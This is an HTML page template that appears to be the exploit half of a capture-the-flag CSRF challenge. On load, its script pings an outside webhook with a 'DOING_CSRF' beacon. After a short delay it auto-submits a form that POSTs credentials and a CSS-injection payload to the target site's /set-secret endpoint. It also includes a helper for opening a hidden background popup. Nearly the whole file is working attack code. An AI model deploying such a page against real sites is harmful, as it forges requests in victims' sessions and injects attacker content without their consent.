<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF</title>
</head>
<body>
    <div class="container text-center">
        <div class="row justify-content-center mb-3">
            <div class="col-10 col-md-6">
                <h5>Input your secret here:</h5>
                
                <form action="{{ chall_url }}/set-secret" method="POST">
                    <input id="input" class="form-control" name="code" rows="2" value="{{ random_password }}"></input>
                    <input id="input" class="form-control" name="username" rows="2" value="{{ random_username }}"></input>
                    <input id="input" class="form-control" name="secret" rows="2" value="{{ css_payload }}"></input>
                    <button type="submit" class="btn btn-primary mt-3">Submit</button>
                </form>
            </div>
        </div>
        <div class="row justify-content-center">
            <div class="col-10 col-md-6">
                <div class="secret-container border p-3">
                    <div class="hover-text">Hover me to show the secret</div>
                    <div class="secret-div" id="secret"></div>
                </div>
            </div>
        </div>
    </div>
<script> 
    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    function popup(url){
        let w = window.open(url, "WINBG", `width=1000, height= 480, left=0, top=0`)
        w.blur();
        window.focus();
        return w;
    }

    async function csrf_submit(){
        await sleep(50);
        document.forms[0].submit();
    }

    fetch("{{ webhook }}?DOING_CSRF", {mode: "no-cors"})

    csrf_submit();    

</script>
</body>
</html>
